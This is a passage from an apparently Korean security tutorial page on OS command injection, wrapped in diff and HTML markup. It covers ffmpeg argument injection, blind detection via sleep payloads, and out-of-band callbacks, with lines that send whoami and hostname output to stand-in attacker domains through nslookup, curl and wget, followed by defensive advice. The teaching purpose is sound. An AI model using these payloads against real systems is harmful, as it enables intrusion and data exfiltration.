+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">  </span><span class="nt">&lt;policy</span><span class="w"> </span><span class="na">domain=</span><span class="s">&quot;coder&quot;</span><span class="w"> </span><span class="na">rights=</span><span class="s">&quot;none&quot;</span><span class="w"> </span><span class="na">pattern=</span><span class="s">&quot;MSL&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="w">  </span><span class="nt">&lt;policy</span><span class="w"> </span><span class="na">domain=</span><span class="s">&quot;coder&quot;</span><span class="w"> </span><span class="na">rights=</span><span class="s">&quot;none&quot;</span><span class="w"> </span><span class="na">pattern=</span><span class="s">&quot;HTTPS&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="w">  </span><span class="nt">&lt;policy</span><span class="w"> </span><span class="na">domain=</span><span class="s">&quot;coder&quot;</span><span class="w"> </span><span class="na">rights=</span><span class="s">&quot;none&quot;</span><span class="w"> </span><span class="na">pattern=</span><span class="s">&quot;URL&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="w">  </span><span class="nt">&lt;policy</span><span class="w"> </span><span class="na">domain=</span><span class="s">&quot;coder&quot;</span><span class="w"> </span><span class="na">rights=</span><span class="s">&quot;none&quot;</span><span class="w"> </span><span class="na">pattern=</span><span class="s">&quot;EPHEMERAL&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="w">  </span><span class="nt">&lt;policy</span><span class="w"> </span><span class="na">domain=</span><span class="s">&quot;coder&quot;</span><span class="w"> </span><span class="na">rights=</span><span class="s">&quot;none&quot;</span><span class="w"> </span><span class="na">pattern=</span><span class="s">&quot;LABEL&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="nt">&lt;/policymap&gt;</span>
+</span></code></pre></div>
+<p>비슷한 사고가 이후로도 반복됐다. 2020년 GhostScript 관련 PostScript 코드 실행, 2022년 ImageMagick 7.x의 SVG 처리 우회 등이 같은 계열이다.</p>
+<h3 id="ffmpeg-인자-인젝션">ffmpeg 인자 인젝션<a class="headerlink" href="#ffmpeg-인자-인젝션" title="Permanent link">&para;</a></h3>
+<p>ffmpeg은 입력 파일명에 <code>-</code> 로 시작하는 문자열이 오면 그걸 옵션으로 해석한다.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># 사용자가 업로드한 파일명: &quot;-i /etc/passwd&quot;</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>ffmpeg<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$user_input</span><span class="s2">&quot;</span><span class="w"> </span>output.mp4
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="c1"># 실제 실행: ffmpeg -i -i /etc/passwd output.mp4</span>
+</span></code></pre></div>
+<p>ffmpeg에는 임의 파일을 읽어서 출력 미디어에 자막이나 필터로 끼워 넣는 기능이 있다. 이 기능과 인자 인젝션이 결합되면 서버 파일 시스템의 임의 파일을 영상 안에 인코딩해서 빼낼 수 있다. SSRF로도 발전 가능하다.</p>
+<p>방어법은 사용자 입력 앞에 <code>--</code>를 붙여서 옵션 종료를 명시하거나, 파일명이 <code>-</code>로 시작하면 거부하는 것이다.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># 옵션 종료 마커 사용</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>ffmpeg<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;./</span><span class="nv">$user_input</span><span class="s2">&quot;</span><span class="w"> </span>output.mp4<span class="w">   </span><span class="c1"># 더 안전: 상대 경로 prefix</span>
+</span></code></pre></div>
+<p>상대 경로 prefix(<code>./</code>)를 붙이는 건 의외로 잘 알려지지 않은 방어책인데, <code>-</code>로 시작하지 않게 만들기 때문에 인자 인젝션을 끊어버린다.</p>
+<hr />
+<h2 id="blind-명령-인젝션-탐지">Blind 명령 인젝션 탐지<a class="headerlink" href="#blind-명령-인젝션-탐지" title="Permanent link">&para;</a></h2>
+<p>명령 결과가 응답에 노출되지 않는 환경에서는 결과를 직접 볼 수 없다. 이때 쓰는 두 가지 기법이 시간 지연과 외부 콜백이다.</p>
+<h3 id="시간-지연-기반-탐지">시간 지연 기반 탐지<a class="headerlink" href="#시간-지연-기반-탐지" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># 7초 정확히 지연되면 인젝션 확정</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="nv">input</span><span class="o">=</span><span class="k">$(</span>sleep<span class="w"> </span><span class="m">7</span><span class="k">)</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="nv">input</span><span class="o">=</span><span class="sb">`</span>sleep<span class="w"> </span><span class="m">7</span><span class="sb">`</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="nv">input</span><span class="o">=</span><span class="p">;</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">7</span><span class="p">;</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="nv">input</span><span class="o">=&amp;&amp;</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">7</span>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="nv">input</span><span class="o">=</span><span class="p">|</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">7</span>
+</span></code></pre></div>
+<p>원래 응답이 200ms인데 페이로드 주입 시 7초가 걸리면 명령이 실행됐다는 뜻이다. 다만 네트워크 지연이나 캐시로 오탐이 발생할 수 있어, 보통 3초·5초·7초처럼 식별 가능한 값을 여러 번 보내서 패턴을 확인한다.</p>
+<h3 id="out-of-bandoob-콜백">Out-of-Band(OOB) 콜백<a class="headerlink" href="#out-of-bandoob-콜백" title="Permanent link">&para;</a></h3>
+<p>시간 지연보다 신뢰도 높은 방법이다. 공격자 통제 도메인으로 DNS 조회나 HTTP 요청을 발생시킨다.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># DNS 콜백 — nslookup이 거의 모든 시스템에 깔려 있다</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="nv">input</span><span class="o">=</span><span class="p">;</span><span class="w"> </span>nslookup<span class="w"> </span>unique-id.attacker-collab.net
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="nv">input</span><span class="o">=</span><span class="k">$(</span>nslookup<span class="w"> </span><span class="k">$(</span>whoami<span class="k">)</span>.attacker-collab.net<span class="k">)</span>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="c1"># HTTP 콜백 — 명령 실행 결과를 호스트명에 인코딩</span>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="nv">input</span><span class="o">=</span><span class="sb">`</span>curl<span class="w"> </span>http://<span class="k">$(</span>hostname<span class="k">)</span>.attacker.com/<span class="sb">`</span>
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="nv">input</span><span class="o">=</span><span class="sb">`</span>wget<span class="w"> </span>http://attacker.com/<span class="k">$(</span>whoami<span class="k">)</span><span class="sb">`</span>
+</span></code></pre></div>
+<p><code>nslookup</code>을 쓰는 이유는 인터넷에 접속을 못하는 내부 서버라도 DNS 쿼리는 풀어주는 환경이 많기 때문이다. 회사 내부 네트워크의 DNS는 외부 도메인 쿼리를 외부로 위임하는 게 일반적이라, 80/443이 막혀 있어도 53번을 통해 데이터가 빠져나간다.</p>
+<p>Burp Collaborator나 interactsh 같은 도구가 이 OOB 인터랙션을 받아주는 서비스를 제공한다. 도메인 하나를 발급받고 페이로드에 박은 뒤, 콘솔에서 인바운드 DNS/HTTP 요청을 확인하는 방식이다.</p>
+<pre class="mermaid-diagram"><code>sequenceDiagram
     participant 공격자
     participant 대상서버
     participant DNS
@@ -136,24 +3165,201 @@
     대상서버-&gt;&gt;DNS: root.abc123.collab.net 조회
     DNS-&gt;&gt;Collaborator: 권한 위임된 NS 쿼리 도달
     Collaborator--&gt;&gt;공격자: 인바운드 로그에 root.abc123 표시
-    Note over 공격자: 실행 사실 + 결과(whoami=root) 동시 확인</code></pre> <p>이 패턴의 무서운 점은 응답에 아무것도 노출되지 않아도 명령 결과를 함께 빼낼 수 있다는 것이다.</p> <hr> <h2 id=방어-방법>방어 방법<a class=headerlink href=#방어-방법 title="Permanent link">&para;</a></h2> <p>순서대로 적용한다. 위쪽일수록 효과가 크다.</p> <h3 id=1-셸을-호출하지-않는다>1. 셸을 호출하지 않는다<a class=headerlink href=#1-셸을-호출하지-않는다 title="Permanent link">&para;</a></h3> <p>이게 본질이다. 다른 모든 방어는 보조 수단이다.</p> <div class="language-typescript highlight"><pre><span></span><code><span id=__span-14-1><a id=__codelineno-14-1 name=__codelineno-14-1 href=#__codelineno-14-1></a><span class=c1>// Node.js — execFile, spawn 모두 기본은 셸 미사용</span>
-</span><span id=__span-14-2><a id=__codelineno-14-2 name=__codelineno-14-2 href=#__codelineno-14-2></a><span class=k>import</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=nx>execFile</span><span class=p>,</span><span class=w> </span><span class=nx>spawn</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=kr>from</span><span class=w> </span><span class=s1>&#39;child_process&#39;</span><span class=p>;</span>
-</span><span id=__span-14-3><a id=__codelineno-14-3 name=__codelineno-14-3 href=#__codelineno-14-3></a><span class=nx>execFile</span><span class=p>(</span><span class=s1>&#39;convert&#39;</span><span class=p>,</span><span class=w> </span><span class=p>[</span><span class=nx>filename</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;output.webp&#39;</span><span class=p>]);</span>
-</span><span id=__span-14-4><a id=__codelineno-14-4 name=__codelineno-14-4 href=#__codelineno-14-4></a><span class=nx>spawn</span><span class=p>(</span><span class=s1>&#39;convert&#39;</span><span class=p>,</span><span class=w> </span><span class=p>[</span><span class=nx>filename</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;output.webp&#39;</span><span class=p>]);</span>
-</span><span id=__span-14-5><a id=__codelineno-14-5 name=__codelineno-14-5 href=#__codelineno-14-5></a>
-</span><span id=__span-14-6><a id=__codelineno-14-6 name=__codelineno-14-6 href=#__codelineno-14-6></a><span class=c1>// Python — shell=False 가 기본값</span>
-</span><span id=__span-14-7><a id=__codelineno-14-7 name=__codelineno-14-7 href=#__codelineno-14-7></a><span class=c1>// subprocess.run([&#39;convert&#39;, filename, &#39;output.webp&#39;])</span>
-</span></code></pre></div> <h3 id=2-외부-명령을-아예-호출하지-않는다>2. 외부 명령을 아예 호출하지 않는다<a class=headerlink href=#2-외부-명령을-아예-호출하지-않는다 title="Permanent link">&para;</a></h3> <p>가능한 경우 라이브러리 바인딩으로 대체한다. 이미지 처리는 sharp(Node.js), Pillow(Python), Thumbnailator(Java) 같은 네이티브 바인딩 라이브러리를 쓰면 ImageMagick 자체를 띄우지 않아도 된다. 외부 프로세스 호출이 사라지면 명령 인젝션도 사라진다.</p> <h3 id=3-인자에-들어갈-값은-allowlist로-제한>3. 인자에 들어갈 값은 allowlist로 제한<a class=headerlink href=#3-인자에-들어갈-값은-allowlist로-제한 title="Permanent link">&para;</a></h3> <p>자유 입력을 그대로 인자로 넘기지 말고, 허용된 값만 통과시킨다.</p> <div class="language-python highlight"><pre><span></span><code><span id=__span-15-1><a id=__codelineno-15-1 name=__codelineno-15-1 href=#__codelineno-15-1></a><span class=n>ALLOWED_FORMATS</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;png&#39;</span><span class=p>,</span> <span class=s1>&#39;jpg&#39;</span><span class=p>,</span> <span class=s1>&#39;webp&#39;</span><span class=p>}</span>
-</span><span id=__span-15-2><a id=__codelineno-15-2 name=__codelineno-15-2 href=#__codelineno-15-2></a>
-</span><span id=__span-15-3><a id=__codelineno-15-3 name=__codelineno-15-3 href=#__codelineno-15-3></a><span class=k>def</span><span class=w> </span><span class=nf>convert</span><span class=p>(</span><span class=n>input_path</span><span class=p>,</span> <span class=n>target_format</span><span class=p>):</span>
-</span><span id=__span-15-4><a id=__codelineno-15-4 name=__codelineno-15-4 href=#__codelineno-15-4></a>    <span class=k>if</span> <span class=n>target_format</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>ALLOWED_FORMATS</span><span class=p>:</span>
-</span><span id=__span-15-5><a id=__codelineno-15-5 name=__codelineno-15-5 href=#__codelineno-15-5></a>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&quot;Unsupported format&quot;</span><span class=p>)</span>
-</span><span id=__span-15-6><a id=__codelineno-15-6 name=__codelineno-15-6 href=#__codelineno-15-6></a>    <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>([</span><span class=s1>&#39;convert&#39;</span><span class=p>,</span> <span class=n>input_path</span><span class=p>,</span> <span class=sa>f</span><span class=s1>&#39;output.</span><span class=si>{</span><span class=n>target_format</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>])</span>
-</span></code></pre></div> <p>블록리스트(금지 문자 목록)는 거의 항상 우회된다. 새로운 메타문자, 인코딩 트릭, 유니코드 변형이 끊임없이 나오기 때문이다. allowlist는 허용된 것만 통과시키므로 우회가 원천 차단된다.</p> <h3 id=4-인자-앞에----또는-경로-prefix를-붙인다>4. 인자 앞에 <code>--</code> 또는 경로 prefix를 붙인다<a class=headerlink href=#4-인자-앞에----또는-경로-prefix를-붙인다 title="Permanent link">&para;</a></h3> <p>인자 인젝션 방어책이다. 사용자 입력이 옵션처럼 해석되는 걸 막는다.</p> <div class="language-python highlight"><pre><span></span><code><span id=__span-16-1><a id=__codelineno-16-1 name=__codelineno-16-1 href=#__codelineno-16-1></a><span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>([</span><span class=s1>&#39;ffmpeg&#39;</span><span class=p>,</span> <span class=s1>&#39;-i&#39;</span><span class=p>,</span> <span class=s1>&#39;--&#39;</span><span class=p>,</span> <span class=n>user_input</span><span class=p>,</span> <span class=s1>&#39;output.mp4&#39;</span><span class=p>])</span>
-</span><span id=__span-16-2><a id=__codelineno-16-2 name=__codelineno-16-2 href=#__codelineno-16-2></a><span class=c1># 또는</span>
-</span><span id=__span-16-3><a id=__codelineno-16-3 name=__codelineno-16-3 href=#__codelineno-16-3></a><span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>([</span><span class=s1>&#39;ffmpeg&#39;</span><span class=p>,</span> <span class=s1>&#39;-i&#39;</span><span class=p>,</span> <span class=sa>f</span><span class=s1>&#39;./</span><span class=si>{</span><span class=n>user_input</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;output.mp4&#39;</span><span class=p>])</span>
-</span></code></pre></div> <p><code>--</code>는 GNU 컨벤션으로 "이 뒤로는 옵션이 아니다"를 의미한다. 모든 도구가 지원하지는 않으니 도구 매뉴얼을 확인해야 한다.</p> <h3 id=5-최소-권한으로-실행>5. 최소 권한으로 실행<a class=headerlink href=#5-최소-권한으로-실행 title="Permanent link">&para;</a></h3> <p>명령 인젝션이 뚫리는 걸 0%로 만들 수는 없으니, 뚫렸을 때 피해를 줄이는 게 다음 방어선이다. 컨테이너로 격리하고, 컨테이너 안에서도 비-root 사용자로 실행한다. seccomp 프로필로 시스템 콜을 제한하면 리버스 셸이 막힐 수 있다.</p> <div class="language-dockerfile highlight"><pre><span></span><code><span id=__span-17-1><a id=__codelineno-17-1 name=__codelineno-17-1 href=#__codelineno-17-1></a><span class=k>FROM</span><span class=w> </span><span class=s>alpine:3.19</span>
-</span><span id=__span-17-2><a id=__codelineno-17-2 name=__codelineno-17-2 href=#__codelineno-17-2></a><span class=k>RUN</span><span class=w> </span>adduser<span class=w> </span>-D<span class=w> </span>-u<span class=w> </span><span class=m>1000</span><span class=w> </span>worker
-</span><span id=__span-17-3><a id=__codelineno-17-3 name=__codelineno-17-3 href=#__codelineno-17-3></a><span class=k>USER</span><span class=w> </span><span class=s>worker</span>
-</span><span id=__span-17-4><a id=__codelineno-17-4 name=__codelineno-17-4 href=#__codelineno-17-4></a><span class=k>ENTRYPOINT</span><span class=w> </span><span class=p>[</span><span class=s2>&quot;/usr/bin/convert&quot;</span><span class=p>]</span>
-</span></code></pre></div> <h3 id=6-미디어-라이브러리-정책-강화>6. 미디어 라이브러리 정책 강화<a class=headerlink href=#6-미디어-라이브러리-정책-강화 title="Permanent link">&para;</a></h3> <p>ImageMagick은 <code>policy.xml</code>에서 위험 코더를 disable한다. ffmpeg은 <code>-protocol_whitelist</code>로 허용 프로토콜을 제한한다. 이 설정이 빠진 운영 서버는 ImageTragick 류 사고에 그대로 노출된다.</p> <hr> <h2 id=사고-사례에서-배우는-것>사고 사례에서 배우는 것<a class=headerlink href=#사고-사례에서-배우는-것 title="Permanent link">&para;</a></h2> <p>ImageTragick 외에도 같은 계열 사고가 반복적으로 발생했다. 패턴을 보면 거의 똑같다.</p> <ul> <li><strong>CVE-2014-6271 Shellshock</strong>: bash 환경 변수를 통한 코드 실행. CGI 스크립트가 사용자 입력을 환경 변수로 넘기는 과정에서 트리거. 명령 인젝션의 변형이다.</li> <li><strong>CVE-2017-12794 Django</strong>: 디버그 페이지 렌더링 중 외부 명령 호출 경로에서 인젝션 가능성.</li> <li><strong>CVE-2021-22204 ExifTool</strong>: 이미지 메타데이터 처리 중 Perl 스크립트 실행. GitLab이 이걸로 RCE를 당했다.</li> <li><strong>CVE-2022-44268 ImageMagick</strong>: PNG 메타데이터 처리에서 임의 파일 읽기. RCE는 아니지만 같은 라이브러리 계열.</li> <li><strong>CVE-2023-44487 / 보안 패치 사례들</strong>: 미디어 변환 컨테이너의 sandboxing 강화 흐름.</li> </ul> <p>공통점은 두 가지다. 첫째, 사용자 입력이 외부 바이너리 인자나 외부 자원 참조로 흘러들어간다. 둘째, 그 바이너리 내부에 코드 실행 경로가 숨어 있다. 직접 셸을 부르지 않아도 라이브러리가 대신 부른다는 게 핵심이다.</p> <p>운영하는 코드에 외부 바이너리 호출이 있다면 다음을 확인한다. 어떤 함수로 호출하는지(셸 경유 여부), 인자에 사용자 입력이 들어가는지, 그 바이너리가 처리하는 파일 포맷에 코드 실행 경로가 있는지. 세 가지 중 하나라도 위험 신호가 보이면 라이브러리 자체를 점검한다.</p> <hr> <h2 id=코드-리뷰-시-확인-포인트>코드 리뷰 시 확인 포인트<a class=headerlink href=#코드-리뷰-시-확인-포인트 title="Permanent link">&para;</a></h2> <p>리뷰 시점에 잡으려면 다음 패턴을 grep한다. 정규식이라기보다 키워드 수준이다.</p> <ul> <li><code>exec(</code>, <code>system(</code>, <code>shell_exec(</code>, <code>popen(</code> — 변수가 들어 있으면 의심</li> <li><code>Runtime.getRuntime().exec(</code> — String 한 개짜리 시그니처는 거의 항상 위험</li> <li><code>child_process.exec(</code> — <code>execFile</code>로 바꿀 수 있는지 확인</li> <li><code>subprocess.run(...shell=True</code> — shell=True 자체가 레드 플래그</li> <li>백틱(<code>`</code>)이 변수와 함께 있는 PHP 코드</li> <li><code>os.system</code>, <code>os.popen</code> 호출 전부</li> </ul> <p>전체 코드베이스에 한 번이라도 위 패턴이 나타나면 그 모든 호출을 따라가서 입력 출처를 추적한다. 사용자 입력이 도달 가능하면 인자 분리(<code>exec → execFile</code>)로 리팩토링한다. 호출 함수를 바꾸는 건 보통 한두 줄 수정이라 비용이 적다.</p> <!-- related-docs --> <hr> <p><strong>관련 문서</strong></p> <ul> <li><a href=../AES/ >AES (Advanced Encryption Standard)</a></li> <li><a href=../AI_for_Security/ >AI로 보안 강화하기 (LLM in Security Operations)</a></li> <li><a href=../API_Gateway_Security/ >API Gateway Security</a></li> <li><a href=../API_Input_Validation/ >API Input Validation</a></li> <li><a href=../API_Security/ >API Security</a></li> </ul> <aside class=md-source-file> <span class=md-source-file__fact> <span class=md-icon title="마지막 업데이트"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg> </span> <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="2026년 8월 9일 04:24:18 UTC">2026년 8월 9일</span> </span> <span class=md-source-file__fact> <span class=md-icon title=작성일> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"/></svg> </span> <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="2026년 7월 3일 07:06:21 UTC">2026년 7월 3일</span> </span> </aside> </article> </div> <script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script> </div> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=하단/푸터> <a href=../Clickjacking/ class="md-footer__link md-footer__link--prev" aria-label="이전: Clickjacking"> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg> </div> <div class=md-footer__title> <span class=md-footer__direction> 이전 </span> <div class=md-ellipsis> Clickjacking </div> </div> </a> <a href=../Insecure_Deserialization/ class="md-footer__link md-footer__link--next" aria-label="다음: 안전하지 않은 역직렬화"> <div class=md-footer__title> <span class=md-footer__direction> 다음 </span> <div class=md-ellipsis> 안전하지 않은 역직렬화 </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2024 - 2026 GYUTORY </div> </div> <div class=md-social> <a href=https://github.com/GYUTORY target=_blank rel=noopener title=github.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><!-- Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg> </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <div class=md-progress data-md-component=progress role=progressbar></div> <script id=__config type=application/json>{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.prune", "navigation.tracking", "navigation.indexes", "navigation.footer", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "content.tooltips", "toc.follow"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\ud074\ub9bd\ubcf4\ub4dc\uc5d0 \ubcf5\uc0ac\ub428", "clipboard.copy": "\ud074\ub9bd\ubcf4\ub4dc\ub85c \ubcf5\uc0ac", "search.result.more.one": "\uc774 \ubb38\uc11c\uc5d0\uc11c 1\uac1c\uc758 \uac80\uc0c9 \uacb0\uacfc \ub354 \ubcf4\uae30", "search.result.more.other": "\uc774 \ubb38\uc11c\uc5d0\uc11c #\uac1c\uc758 \uac80\uc0c9 \uacb0\uacfc \ub354 \ubcf4\uae30", "search.result.none": "\uac80\uc0c9\uc5b4\uc640 \uc77c\uce58\ud558\ub294 \ubb38\uc11c\uac00 \uc5c6\uc2b5\ub2c8\ub2e4", "search.result.one": "1\uac1c\uc758 \uc77c\uce58\ud558\ub294 \ubb38\uc11c", "search.result.other": "#\uac1c\uc758 \uc77c\uce58\ud558\ub294 \ubb38\uc11c", "search.result.placeholder": "\uac80\uc0c9\uc5b4\ub97c \uc785\ub825\ud558\uc138\uc694", "search.result.term.missing": "\ud3ec\ud568\ub418\uc9c0 \uc54a\uc740 \uac80\uc0c9\uc5b4", "select.version": "\ubc84\uc804 \uc120\ud0dd"}, "version": null}</script> <script src=../../assets/javascripts/bundle.d7400e89.min.js></script> <script src=../../javascripts/extra.js></script> <script src=../../javascripts/mermaid-init.js></script> </body> </html>
+    Note over 공격자: 실행 사실 + 결과(whoami=root) 동시 확인</code></pre>
+<p>이 패턴의 무서운 점은 응답에 아무것도 노출되지 않아도 명령 결과를 함께 빼낼 수 있다는 것이다.</p>
+<hr />
+<h2 id="방어-방법">방어 방법<a class="headerlink" href="#방어-방법" title="Permanent link">&para;</a></h2>
+<p>순서대로 적용한다. 위쪽일수록 효과가 크다.</p>
+<h3 id="1-셸을-호출하지-않는다">1. 셸을 호출하지 않는다<a class="headerlink" href="#1-셸을-호출하지-않는다" title="Permanent link">&para;</a></h3>
+<p>이게 본질이다. 다른 모든 방어는 보조 수단이다.</p>
